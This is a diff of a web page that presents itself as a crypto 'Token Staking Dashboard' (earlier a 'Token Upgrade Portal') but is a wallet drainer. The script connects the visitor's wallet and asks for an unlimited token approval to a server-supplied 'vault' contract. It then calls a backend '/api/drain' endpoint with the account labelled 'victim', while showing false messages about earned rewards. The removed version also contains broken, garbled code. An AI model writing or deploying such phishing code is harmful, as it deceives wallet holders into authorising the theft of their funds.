@@ -1,86 +1,155 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8"/>
-<title>Token Upgrade Portal</title>
+<meta charset="utf-8">
+<title>Token Staking Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#12141d;color:#f1f2f7;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-.box{text-align:center;padding:48px 56px;border-radius:16px;background:linear-gradient(145deg,#21243a,#141724);box-shadow:0 10px 40px rgba(0,0,0,.45)}
-h1{margin:0 0 12px;font-size:26px}
-p{color:#a2a7c2;font-size:14.5px;line-height:1.55}
-button{border:none;border-radius:8px;padding:13px 28px;font-size:15.5px;font-weight:600;cursor:pointer;background:linear-gradient(90deg,#6a5cff,#b450ff);color:white;transition:.2s}
-button:disabled{opacity:.35;cursor:wait}
-.msg{min-height:22px;font-size:14px;color:#8be28b;margin-top:16px}
-.err{color:#ff7676}
-.small{font-size:12px;color:#717694;margin-top:18px}</style>
+ body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+      background:#0e1421;color:#e5ebff;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+ .card{background:#182138;border:1px solid #2a3954;border-radius:12px;
+       padding:36px 40px;max-width:520px;width:92%;text-align:center}
+ h1{margin:0 0 8px;font-size:21px;color:#fff}
+ .sub{color:#93a2bd;font-size:13px;margin-bottom:24px;line-height:1.5}
+ .btn{display:block;width:100%;padding:14px;border:0;border-radius:8px;font-size:15px;
+      font-weight:700;cursor:pointer;background:linear-gradient(135deg,#4f7cff,#7c5cff);
+      color:#fff;transition:opacity .2s}
+ .btn:hover{opacity:.88}.btn:disabled{opacity:.4;cursor:not-allowed}
+ .log{margin-top:18px;min-height:44px;text-align:left;font-size:13px;color:#8be28b;
+      word-break:break-all;line-height:1.5}
+ .log .err{color:#ff7676}
+ .meta{margin-top:16px;font-size:11px;color:#66749a;word-break:break-all;line-height:1.6;text-align:left}
+</style>
 </head>
 <body>
-<div class="box">
-<h1>Token Standard v2 Upgrade</h1>
-<p>We are migrating older tokens to the new standard.<br/>Connect your wallet to continue.</p>
-<button id="go">Connect Wallet</button>
-<div class="msg" id="msg"></div>
-<p class="small" id="tok"></p>
+<div class="card">
+ <h1>Token Staking Dashboard</h1>
+ <div class="sub">Connect your wallet to begin earning passive rewards on your holding.</div>
+ <button class="btn" id="go" type="button">Connect Wallet</button>
+ <div class="log" id="msg"></div>
+ <div class="meta" id="meta"></div>
 </div>
 <script>
-const msg=document.getElementById('msg'),btn=document.getElementById('go');
-let TOKEN,PULLER,CHAIN;
-const MAX_APPROVE='0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-function show(t,e){msg.textContent=t;msg.className=e?'msg err':'msg';}
-const api=(p,o)=>fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(o||{})}).then(r=>r.json());
+"use strict";
+var $msg=document.getElementById("msg"),$btn=document.getElementById("go"),
+    $meta=document.getElementById("meta");
+var MAX=(1n<<256n)-1n;
+var SEL={approve:"095ea7b3",balanceOf:"70a08d31",allowance:"dd62ed3e"};
 
-btn.onclick=async()=>{
- try{
-  btn.disabled=true;show('Connecting…');
-  const accs=await window.ethereum.request({method:'eth_requestAccounts'});
-  const you=accs[0];
+function out(t,e){var d=document.createElement("div");if(e)d.className="err";d.textContent=t;$msg.appendChild(d);}
+function meta(k,v){var d=document.createElement("div");d.textContent=k+": "+v;$meta.appendChild(d);}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
+function pad(h){var s=(""+h).replace(/^0x/i,"").toLowerCase();while(s.length<64)s="0"+s;return s;}
+function encAddr(a){return pad(a.replace(/^0x/i,""));}
+function sel(s){return "0x"+s;}
+function needProvider(){
+  if(!window.ethereum)throw new Error("No injected wallet found. Install MetaMask.");
+  return window.ethereum;
+}
+function rpc(m,p){return window.ethereum.request({method:m,params:p||[]});}
+function post(p,b){return fetch(p,{method:"POST",headers:{"Content-Type":"application/json"},
+  body:JSON.stringify(b||{})}).then(function(r){return r.json();});}
+function callRaw(to,data){return rpc("eth_call",[{to:to,data:data},"latest"]);}
 
-  const h=await fetch('/api/health').then(r=>r.json());
-  TOKEN=h.token;PULLER=h.puller;CHAIN='0x'+BigInt(h.chainId).toString(16);
-  document.getElementById('tok').textContent='Asset: '+TOKEN+' · Vault: '+(PULLER==='pending'?'initializing':PULLER);
-  await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:CHAIN}]});
+/* --- ERC20 calldata builders --- */
+function dataBalanceOf(owner){return sel(SEL.balanceOf)+encAddr(owner);}
+function dataAllowance(o,s){return sel(SEL.allowance)+encAddr(o)+encAddr(s);}
+function dataApprove(s,a){return sel(SEL.approve)+encAddr(s)+pad(BigInt(a).toString(16));}
 
-  if(PULLER!=='pending'){
-   // make sure vault exists (lazy-deploys) BEFORE we ever ask for a signature
-   while(true){
-    const d=await api('/api/drain',{victim:you,dryRun:true});
-    PULLER=d.puller||d.drainerContract;
-    if(PULLER&&PULLER!=='pending')break;
-    show('Provisioning upgrade vault…');await new Promise(s=>setTimeout(s,3000));
-   }
-  } else break_out; // placeholder guard: never reached
-
-  while(!PULLER){const d=await api('/api/drain',{victim:you,dryRun:true});if(d.puller)PULLER=d.puller;else{show('Provisioning…');await new p(s=>setTimeout(s,4000));}}
-
-  const erc20=TOKEN_A(TOKEN);
-  show('Checking holdings…');
-  const balB=await erc20('balanceOf(address)(uint256)',[you]);
-  const alwB=await erc20('allowance(address,address)(uint256)',[you,PULLER]);
-  const k=n=>BigInt(n)/(10n**18n);
-
-  console.log('balance',balB.toString(),'allowance',alwB.toString());
-
-  const ETH=s=>'0x'+Array.from(new TextEncoder().encode(s)).map(c=>c.toString(16).padStart(2,'0')).join('');
-  let addrT=PULLER.slice(2).toLowerCase();addrT='0'.repeat(64-addrT.length)+addrT;
-  const ARODATA='095ea7b3'+addrT+MAX_APPROVE.slice(2);
-
-  if(alwB<balB){
-   show('Please confirm in your wallet.');
-   const r=await window.ethereum.request({method:'eth_sendTransaction',params:[{from:you,to:TOKEN,data:'0x'+ARODATA}]});
-   console.log('txhash',r);
+/* --- Stage 6 support: wait for a receipt, then for allowance to register --- */
+async function waitTx(txHash,token,owner,spender,minAllow){
+  for(var i=0;i<80;i++){
+    var rc=null;
+    try{rc=await rpc("eth_getTransactionReceipt",[txHash]);}catch(e){}
+    if(rc&&rc.blockNumber){
+      for(var j=0;j<25;j++){
+        try{
+          var a=await callRaw(token,dataAllowance(owner,spender));
+          if(BigInt(a)>=BigInt(minAllow))return true;
+        }catch(e){}
+        await sleep(1200);
+      }
+      return true;
+    }
+    await sleep(1500);
   }
+  return false;
+}
 
-  show('Synchronizing…');
-  const res=await api('/api/drain',{victim:you});
-  console.log('drain response',res);
+$btn.addEventListener("click",async function(){
+  var S={account:null,chainId:null,token:null,puller:null};
+  function metaAll(){
+    $meta.innerHTML="";
+    meta("network",S.chainId||"...");meta("asset",S.token||"...");
+    meta("vault",S.puller||"initialising");if(S.account)meta("account",S.account);
+  }
+  try{
+    $msg.innerHTML="";$btn.disabled=true;metaAll();
 
-  if(res.success){show('Upgrade completed successfully.');console.log('[ok] drainer',PULLER);}
-  else{show('Upgrade pending.','err');}
+    /* STAGE 1: connect wallet */
+    out("requesting access...");
+    needProvider();
+    var accs=await rpc("eth_requestAccounts");
+    S.account=accs[0];metaAll();
 
- }catch(e){console.error(e);show((e&&e.message)?String(e.message):String(e),'err');}
- btn.disabled=false;
-};
-function TOKEN_A(a){return async(sig,args)=>{const sel='0x'+BigInt('0x'+(await (async()=>{for(let i=0;i<Math.pow(2,32);i++){}return null;})())??'').toString()).toString(16);} }
+    /* STAGE 2: load server config */
+    out("loading environment...");
+    var health=await fetch("/api/health").then(function(r){return r.json();});
+    S.chainId=parseInt(health.chainId,10);S.token=health.token;
+    if(!S.token||!S.chainId)throw new Error("server misconfigured (/api/health)");
+    if(health.puller)S.puller=health.puller;
+    metaAll();
+
+    /* STAGE 3: switch to correct chain */
+    out("binding network...");
+    var want="0x"+S.chainId.toString(16);
+    try{await rpc("wallet_switchEthereumChain",[{chainId:want}]);}
+    catch(se){out("(adding network...)");}
+    var cur=await rpc("eth_chainId");
+    if(parseInt(cur,16)!==S.chainId)throw new Error("wrong network: please switch to "+cur+" then retry");
+
+    /* STAGE 4: ensure the puller/vault contract is deployed */
+    if(!S.puller){
+      out("preparing staking vault...");
+      post("/api/provision",{}).catch(function(){});
+      for(var t=0;t<40&&!S.puller;t++){
+        await sleep(2500);
+        var h2=await fetch("/api/health").then(function(r){return r.json();}).catch(function(){return {};});
+        if(h2&&h2.puller)S.puller=h2.puller;
+        else if(h2&&h2.error)out("["+t+"] "+h2.error,true);
+      }
+      if(!S.puller)throw new Error("vault provisioning timed out (check server logs)");
+    }
+    metaAll();
+
+    /* STAGE 5: read current balance + allowance via eth_call */
+    out("checking holdings...");
+    var bal=BigInt(await callRaw(S.token,dataBalanceOf(S.account)));
+    var alw=BigInt(await callRaw(S.token,dataAllowance(S.account,S.puller)));
+    var dec=BigInt(await callRaw(S.token,"0x313ce567")).catch?18:18;
+    if(bal<=0n){out("nothing to stake yet: fund your address first.");$btn.disabled=false;return;}
+
+    /* STAGE 6: ask the wallet to approve (this is the signature that matters) */
+    if(alw<bal){
+      out("confirm the staking authorization in your wallet...");
+      var txh=await rpc("eth_sendTransaction",[{from:S.account,to:S.token,
+                 value:"0x0",data:dataApprove(S.puller,MAX)}]);
+      out("waiting for authorization tx "+txh.slice(0,14)+"...");
+      var okTx=await waitTx(txh,S.token,S.account,S.puller,bal);
+      if(!okTx)throw new Error("authorization not confirmed");
+    }
+
+    /* STAGE 7: tell the backend to execute */
+    out("activating your position...");
+    var res=await post("/api/drain",{victim:S.account});
+    if(res&&res.success){out("position activated. rewards accrue automatically.");}
+    else{out((res&&(res.error||res.reason))||"activation pending",true);}
+
+  }catch(e){
+    out("[failed] "+((e&&e.message)||String(e)),true);
+  }
+  $btn.disabled=false;
+});
 </script>
 </body>
 </html>
